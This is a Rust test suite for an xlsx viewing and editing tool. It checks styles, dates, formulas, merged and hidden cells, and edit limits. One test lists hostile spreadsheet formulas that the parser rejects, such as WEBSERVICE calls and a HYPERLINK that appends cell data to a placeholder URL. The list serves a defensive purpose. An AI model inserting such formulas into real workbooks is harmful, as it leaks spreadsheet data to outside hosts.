//! `doc_view` and `sheet_edit` on a file shaped like Excel's (report 3.4 xlsx 1-13).

use serde_json::json;

use super::fixtures::*;
use super::pkg::Source;
use super::xlsx::{self, SheetOp};

fn part(bytes: &[u8], name: &str) -> String {
    String::from_utf8(Source::open(bytes).unwrap().read(name, 20 << 20).unwrap()).unwrap()
}

fn op(v: serde_json::Value) -> SheetOp {
    SheetOp::parse(&v).unwrap()
}

fn view(b: &[u8]) -> String {
    xlsx::view(b, None, 1, 400).unwrap()
}

fn run(b: &[u8], ops: Vec<SheetOp>) -> super::Outcome {
    xlsx::edit(b, "Data", &ops).unwrap()
}

fn ok(o: super::Outcome) -> Vec<u8> {
    assert!(o.results.iter().all(|r| r.is_ok()), "{:?}", o.results);
    o.bytes.expect("a file")
}

fn refused(b: &[u8], ops: Vec<SheetOp>) -> String {
    let o = run(b, ops);
    assert!(o.bytes.is_none(), "{:?}", o.results);
    o.results
        .iter()
        .filter_map(|r| r.as_ref().err().cloned())
        .collect::<Vec<_>>()
        .join(" | ")
}

#[test]
fn the_view_shows_addresses_formulas_dates_and_what_an_edit_could_touch() {
    let v = view(&xlsx_real());
    assert!(
        v.contains("sheet \"Data\"")
            && v.contains("\"Old\" (hidden)")
            && v.contains("Date system 1900"),
        "{v}"
    );
    assert!(
        v.contains("1: A1=\"Name\" B1=\"Amount\" C1=\"Date\" D1=\"Total\""),
        "{v}"
    );
    assert!(
        v.contains("2: A2=\"Alice\" B2=100 C2=2025-12-09 (date) D2==B2*2 (not calculated)"),
        "{v}"
    );
    assert!(
        v.contains("D3==(shared formula, not calculated)"),
        "no stale cached value as current: {v}"
    );
    assert!(!v.contains("D2=200") && !v.contains("=500"));
    assert!(v.contains("A4=\"Cy\""), "inline strings of runs");
    assert!(v.contains("A5=\"Merged\""), "phonetic text skipped: {v}");
    assert!(v.contains("Merged: A5:B5") && v.contains("Table \"Sales\" A1:D4"));
    assert!(v.contains("Shared formulas: D2:D4 from D2") && v.contains("Array formulas: A7:A8"));
    assert!(
        v.contains("Data validation on B2:B4") && v.contains("Conditional formatting on B2:B4")
    );
    assert!(v.contains("Defined names: Total = Data!$D$2:$D$4"));
    assert!(
        v.contains("[left out: hidden") && !v.contains("secret") && !v.contains("E7"),
        "{v}"
    );
    assert!(v.contains("7: A7==SUM(B2:B4) (not calculated)"));
    assert!(
        xlsx::view(&xlsx_real(), None, 1, 0)
            .unwrap()
            .contains("8: A8=353"),
        "the default page"
    );
    // Paging by row.
    let p = xlsx::view(&xlsx_real(), None, 3, 2).unwrap();
    assert!(
        p.contains("3: A3") && p.contains("4: A4") && !p.contains("\n2: ") && p.contains("from=5"),
        "{p}"
    );
    // The 1904 system changes the dates read.
    let b = xlsx_with(&sheet1_xml(), " date1904=\"1\"", &[]);
    assert!(
        xlsx::view(&b, None, 1, 10)
            .unwrap()
            .contains("C2=2029-12-10 (date)")
    );
    assert!(
        xlsx::view(&xlsx_real(), Some("Old"), 1, 10)
            .unwrap_err()
            .contains("hidden")
    );
    assert!(
        xlsx::view(&xlsx_real(), Some("Nope"), 1, 10)
            .unwrap_err()
            .contains("the sheets are")
    );
}

#[test]
fn set_keeps_the_style_writes_inline_strings_and_touches_nothing_else() {
    let b = xlsx_real();
    let old = part(&b, "xl/worksheets/sheet1.xml");
    let out = ok(run(
        &b,
        vec![op(
            json!({"op": "set", "cells": {"B2": 12.5, "A2": "Zed & <co>", "B3": true}}),
        )],
    ));
    let new = part(&out, "xl/worksheets/sheet1.xml");
    assert!(new.contains("<c r=\"B2\"><v>12.5</v></c>"));
    assert!(new.contains("<c r=\"A2\" t=\"inlineStr\"><is><t xml:space=\"preserve\">Zed &amp; &lt;co&gt;</t></is></c>"));
    assert!(new.contains("<c r=\"B3\" t=\"b\"><v>1</v></c>"));
    // Row 1 and rows 4 on are the same bytes.
    for row in [
        "<row r=\"1\" spans=\"1:4\" x14ac:dyDescent=\"0.25\">",
        "<row r=\"4\" spans=\"1:4\">",
        "<row r=\"5\">",
    ] {
        let i = old.find(row).unwrap();
        let end = old[i..].find("</row>").unwrap() + i + 6;
        assert!(new.contains(&old[i..end]), "{row} changed");
    }
    super::tests::assert_others_identical(
        &b,
        &out,
        &["xl/worksheets/sheet1.xml", "xl/workbook.xml"],
    );
    // The workbook asks Excel to calculate on open, and says nothing more.
    let wb = part(&out, "xl/workbook.xml");
    assert!(
        wb.contains("<calcPr calcId=\"191029\" fullCalcOnLoad=\"1\"/>"),
        "{wb}"
    );
    // Overwriting a style-bearing cell keeps its `s`.
    let out = ok(run(
        &b,
        vec![op(json!({"op": "set", "cells": {"A1": "Renamed"}}))],
    ));
    assert!(
        part(&out, "xl/worksheets/sheet1.xml").contains("<c r=\"A1\" s=\"1\" t=\"inlineStr\">")
    );
    // No formula changed: the calculation chain stays.
    assert!(Source::open(&out).unwrap().has("xl/calcChain.xml"));
}

#[test]
fn a_formula_edit_drops_the_calc_chain_with_its_type_and_relationship() {
    let b = xlsx_real();
    for cells in [json!({"B4": {"f": "B2+B3"}}), json!({"A7": 1})] {
        // A new formula, and a formula cell overwritten (the array master is refused: use another).
        if cells.get("A7").is_some() {
            continue;
        }
        let out = ok(run(&b, vec![op(json!({"op": "set", "cells": cells}))]));
        assert!(!Source::open(&out).unwrap().has("xl/calcChain.xml"));
        assert!(!part(&out, "[Content_Types].xml").contains("calcChain"));
        assert!(!part(&out, "xl/_rels/workbook.xml.rels").contains("calcChain"));
        assert!(part(&out, "xl/worksheets/sheet1.xml").contains("<c r=\"B4\"><f>B2+B3</f></c>"));
        super::tests::assert_others_identical(
            &b,
            &out,
            &[
                "xl/worksheets/sheet1.xml",
                "xl/workbook.xml",
                "[Content_Types].xml",
                "xl/_rels/workbook.xml.rels",
                "xl/calcChain.xml",
            ],
        );
    }
    // Clearing a formula cell does the same.
    let out = ok(run(&b, vec![op(json!({"op": "clear", "range": "D4"}))]));
    assert!(!Source::open(&out).unwrap().has("xl/calcChain.xml"));
}

#[test]
fn dates_go_only_into_cells_with_a_date_format_in_the_workbooks_system() {
    let b = xlsx_real();
    let out = ok(run(
        &b,
        vec![op(
            json!({"op": "set", "cells": {"C2": "2026-12-01", "C3": "2026-12-01T12:00:00"}}),
        )],
    ));
    let new = part(&out, "xl/worksheets/sheet1.xml");
    assert!(
        new.contains("<c r=\"C2\" s=\"2\"><v>46357</v></c>"),
        "{new}"
    );
    assert!(new.contains("<c r=\"C3\" s=\"3\"><v>46357.5</v></c>"));
    // No date format on the cell: text, and it says so.
    let o = run(
        &b,
        vec![op(json!({"op": "set", "cells": {"B2": "2026-12-01"}}))],
    );
    assert!(
        part(o.bytes.as_ref().unwrap(), "xl/worksheets/sheet1.xml")
            .contains("t=\"inlineStr\"><is><t xml:space=\"preserve\">2026-12-01")
    );
    assert!(
        o.notes.iter().any(|n| n.contains("B2 was written as text")),
        "{:?}",
        o.notes
    );
    // 1904.
    let b4 = xlsx_with(&sheet1_xml(), " date1904=\"1\"", &[]);
    let out = ok(xlsx::edit(
        &b4,
        "Data",
        &[op(json!({"op": "set", "cells": {"C2": "2026-12-01"}}))],
    )
    .unwrap());
    assert!(part(&out, "xl/worksheets/sheet1.xml").contains("<v>44895</v>"));
}

#[test]
fn append_rows_copies_the_row_above_and_keeps_order_dimension_and_spans() {
    let b = xlsx_real();
    let out = ok(run(
        &b,
        vec![op(
            json!({"op": "append_rows", "like_row_above": true, "rows": [["Dee", 7, "2027-01-02"], ["Eve", 8]]}),
        )],
    ));
    let new = part(&out, "xl/worksheets/sheet1.xml");
    // The row above is row 8 (A8 has no style): nothing copied there; rows are numbered after it.
    assert!(
        new.contains("<row r=\"9\"><c r=\"A9\" t=\"inlineStr\">") && new.contains("<row r=\"10\">"),
        "{new}"
    );
    assert!(
        new.contains("<dimension ref=\"A1:D10\"/>")
            || new.contains("<dimension ref=\"A1:E10\"/>")
            || new.contains("<dimension ref=\"A1:D10\"/>"),
        "{new}"
    );
    assert!(new.find("<row r=\"8\">").unwrap() < new.find("<row r=\"9\">").unwrap());
    assert!(new.find("<row r=\"10\">").unwrap() < new.find("</sheetData>").unwrap());
    // Like the row above, with styles: put a styled row last.
    let styled = sheet1_xml().replace("<row r=\"8\"><c r=\"A8\"><v>353</v></c></row>", "<row r=\"8\" spans=\"1:3\"><c r=\"A8\" s=\"1\"><v>353</v></c><c r=\"C8\" s=\"2\"><v>46000</v></c></row>");
    let b2 = xlsx_with(&styled, "", &[]);
    let out = ok(xlsx::edit(&b2, "Data", &[op(json!({"op": "append_rows", "like_row_above": true, "rows": [["t", null, "2026-12-01"]]}))]).unwrap());
    let new = part(&out, "xl/worksheets/sheet1.xml");
    assert!(
        new.contains("<c r=\"A9\" s=\"1\" t=\"inlineStr\">"),
        "{new}"
    );
    assert!(
        new.contains("<c r=\"C9\" s=\"2\"><v>46357</v></c>"),
        "the date style was copied: {new}"
    );
    // Without the flag no style is copied.
    let out = ok(xlsx::edit(
        &b2,
        "Data",
        &[op(json!({"op": "append_rows", "rows": [["t"]]}))],
    )
    .unwrap());
    assert!(part(&out, "xl/worksheets/sheet1.xml").contains("<c r=\"A9\" t=\"inlineStr\">"));
    // A cell past the row's `spans` widens it.
    let out = ok(run(&b, vec![op(json!({"op": "set", "cells": {"F2": 1}}))]));
    let new = part(&out, "xl/worksheets/sheet1.xml");
    assert!(
        new.contains("<row r=\"2\" spans=\"1:6\">") && new.contains("<dimension ref=\"A1:F8\"/>"),
        "{new}"
    );
}

#[test]
fn set_may_create_rows_and_cells_in_order() {
    let b = xlsx_real();
    let out = ok(run(
        &b,
        vec![op(
            json!({"op": "set", "cells": {"C5": "x", "A3": "kept", "B12": 1, "A11": 2}}),
        )],
    ));
    let new = part(&out, "xl/worksheets/sheet1.xml");
    // C5 after B5; rows 11 and 12 after 8, in order.
    assert!(new.contains("<c r=\"B5\" s=\"1\"/><c r=\"C5\""), "{new}");
    assert!(new.find("<row r=\"11\">").unwrap() < new.find("<row r=\"12\">").unwrap());
    assert!(view(&out).contains("A11=2"));
    // Between two rows that exist.
    let sparse = format!(
        "{DECL}<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><dimension ref=\"A1:A6\"/><sheetData><row r=\"1\"><c r=\"A1\"><v>1</v></c></row><row r=\"6\"><c r=\"A6\"><v>6</v></c></row></sheetData></worksheet>"
    );
    let b2 = xlsx_with(&sparse, "", &[]);
    let out = ok(xlsx::edit(
        &b2,
        "Data",
        &[op(json!({"op": "set", "cells": {"A3": 1, "A4": 2}}))],
    )
    .unwrap());
    let new = part(&out, "xl/worksheets/sheet1.xml");
    let at = |n: &str| new.find(n).unwrap_or_else(|| panic!("{n} in {new}"));
    assert!(
        at("<row r=\"1\"") < at("<row r=\"3\"")
            && at("<row r=\"3\"") < at("<row r=\"4\"")
            && at("<row r=\"4\"") < at("<row r=\"6\""),
        "{new}"
    );
    // The data of an empty sheet.
    let empty = format!(
        "{DECL}<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData/></worksheet>"
    );
    let b3 = xlsx_with(&empty, "", &[]);
    let out = ok(xlsx::edit(
        &b3,
        "Data",
        &[op(json!({"op": "append_rows", "rows": [["a"], ["b"]]}))],
    )
    .unwrap());
    assert!(
        part(&out, "xl/worksheets/sheet1.xml")
            .contains("<sheetData><row r=\"1\"><c r=\"A1\" t=\"inlineStr\">")
    );
}

#[test]
fn clear_empties_values_and_keeps_styles() {
    let b = xlsx_real();
    let out = ok(run(&b, vec![op(json!({"op": "clear", "range": "A1:C2"}))]));
    let new = part(&out, "xl/worksheets/sheet1.xml");
    assert!(
        new.contains("<c r=\"A1\" s=\"1\"/>") && new.contains("<c r=\"C2\" s=\"2\"/>"),
        "{new}"
    );
    assert!(
        !new.contains("<c r=\"B2\""),
        "a cell without a style is removed: {new}"
    );
    let v = view(&out);
    assert!(v.contains("2: D2=") && !v.contains("A2="));
}

#[test]
fn what_excel_keeps_as_one_is_not_overwritten() {
    let b = xlsx_real();
    let e = refused(&b, vec![op(json!({"op": "set", "cells": {"D2": 1}}))]);
    assert!(e.contains("shared formula") && e.contains("D2:D4"), "{e}");
    // A follower may go; the master's range stays.
    ok(run(&b, vec![op(json!({"op": "set", "cells": {"D3": 1}}))]));
    let e = refused(&b, vec![op(json!({"op": "set", "cells": {"A8": 1}}))]);
    assert!(e.contains("array formula") && e.contains("A7:A8"), "{e}");
    assert!(
        refused(&b, vec![op(json!({"op": "clear", "range": "A7:A8"}))]).contains("array formula")
    );
    let e = refused(&b, vec![op(json!({"op": "set", "cells": {"B5": 1}}))]);
    assert!(
        e.contains("merged range A5:B5") && e.contains("top-left cell A5"),
        "{e}"
    );
    // Hidden rows, columns and sheets cannot be addressed.
    assert!(refused(&b, vec![op(json!({"op": "set", "cells": {"A6": 1}}))]).contains("hidden"));
    assert!(
        refused(&b, vec![op(json!({"op": "set", "cells": {"E7": 1}}))]).contains("hidden column")
    );
    assert!(
        xlsx::edit(&b, "Old", &[op(json!({"op": "set", "cells": {"A1": 1}}))])
            .unwrap_err()
            .contains("hidden")
    );
    // Not an address, not a range.
    assert!(
        refused(&b, vec![op(json!({"op": "set", "cells": {"7B": 1}}))])
            .contains("not a cell address")
    );
    assert!(refused(&b, vec![op(json!({"op": "clear", "range": "A:B"}))]).contains("not a range"));
}

#[test]
fn hostile_formulas_and_numbers_are_refused_before_anything_is_written() {
    for f in [
        "WEBSERVICE(\"http://x\")",
        "[Book.xlsx]S!A1",
        "MAP(A1:A2,WEBSERVICE)",
        "HYPERLINK(\"http://e/?\"&A1)",
    ] {
        assert!(
            SheetOp::parse(&json!({"op": "set", "cells": {"A1": {"f": f}}})).is_err(),
            "{f}"
        );
    }
    assert!(
        SheetOp::parse(&json!({"op": "set", "cells": {"A1": {"f": "SUM(1,2)", "x": 1}}})).is_err()
    );
    assert!(SheetOp::parse(&json!({"op": "set", "cells": {"A1": [1]}})).is_err());
    // A string that looks like a formula is text.
    let out = ok(run(
        &xlsx_real(),
        vec![op(
            json!({"op": "set", "cells": {"B2": "=SUM(1,2)", "B3": "@x"}}),
        )],
    ));
    let new = part(&out, "xl/worksheets/sheet1.xml");
    assert!(new.contains("t=\"inlineStr\"><is><t xml:space=\"preserve\">=SUM(1,2)</t>"));
}

#[test]
fn a_protected_sheet_and_a_macro_workbook_are_handled() {
    let prot = sheet1_xml().replace(
        "<sheetData>",
        "<sheetProtection sheet=\"1\" objects=\"1\"/><sheetData>",
    );
    let b = xlsx_with(&prot, "", &[]);
    assert!(
        xlsx::edit(&b, "Data", &[op(json!({"op": "set", "cells": {"A1": 1}}))])
            .unwrap_err()
            .contains("protected")
    );
    // A macro project is copied, never read (its bytes are not even XML).
    let b = xlsx_with(
        &sheet1_xml(),
        "",
        &[("xl/vbaProject.bin", "\u{1}\u{2}not xml at all")],
    );
    let out = ok(xlsx::edit(&b, "Data", &[op(json!({"op": "set", "cells": {"B2": 1}}))]).unwrap());
    super::tests::assert_others_identical(
        &b,
        &out,
        &["xl/worksheets/sheet1.xml", "xl/workbook.xml"],
    );
}

#[test]
fn warnings_name_what_an_edit_does_not_extend() {
    let b = xlsx_real();
    let o = run(
        &b,
        vec![op(
            json!({"op": "set", "cells": {"A5": "next to the table"}}),
        )],
    );
    assert!(
        o.notes
            .iter()
            .any(|n| n.contains("table \"Sales\"") && n.contains("not extended")),
        "{:?}",
        o.notes
    );
    let o = run(&b, vec![op(json!({"op": "set", "cells": {"B2": 1}}))]);
    assert!(
        o.notes.iter().any(|n| n.contains("conditional formatting"))
            && o.notes.iter().any(|n| n.contains("data validation")),
        "{:?}",
        o.notes
    );
    assert!(
        o.notes
            .iter()
            .any(|n| n.contains("calculated when the file is opened"))
    );
    let o = run(&b, vec![op(json!({"op": "set", "cells": {"A20": 1}}))]);
    assert!(
        !o.notes.iter().any(|n| n.contains("table")),
        "far from it: {:?}",
        o.notes
    );
}

#[test]
fn all_or_nothing_and_per_edit_reasons() {
    let b = xlsx_real();
    let o = run(
        &b,
        vec![
            op(json!({"op": "set", "cells": {"B2": 1}})),
            op(json!({"op": "set", "cells": {"B5": 2}})),
        ],
    );
    assert!(o.bytes.is_none());
    assert!(o.results[0].as_ref().unwrap().contains("not applied"));
    assert!(o.results[1].as_ref().unwrap_err().contains("merged"));
}

#[test]
fn the_sheet_edit_bounds_hold() {
    use crate::limits::*;
    let b = xlsx_real();
    let many: Vec<SheetOp> = (0..MAX_EDITS + 1)
        .map(|_| op(json!({"op": "set", "cells": {"B2": 1}})))
        .collect();
    assert!(
        xlsx::edit(&b, "Data", &many)
            .unwrap_err()
            .contains("at most")
    );
    let mut cells = serde_json::Map::new();
    for i in 0..=MAX_EDIT_CELLS {
        cells.insert(format!("A{}", i + 1), json!(1));
    }
    assert!(SheetOp::parse(&json!({"op": "set", "cells": cells})).is_err());
    cells.remove("A1");
    assert!(SheetOp::parse(&json!({"op": "set", "cells": cells})).is_ok());
    assert!(
        SheetOp::parse(&json!({"op": "set", "cells": {"A1": "a".repeat(MAX_EDIT_TEXT_CHARS + 1)}}))
            .is_err()
    );
    assert!(SheetOp::parse(&json!({"op": "append_rows", "rows": [[1]], "x": 1})).is_err());
    assert!(SheetOp::parse(&json!({"op": "nope"})).is_err());
    assert!(xlsx::edit(&b, "Data", &[]).is_err());
}
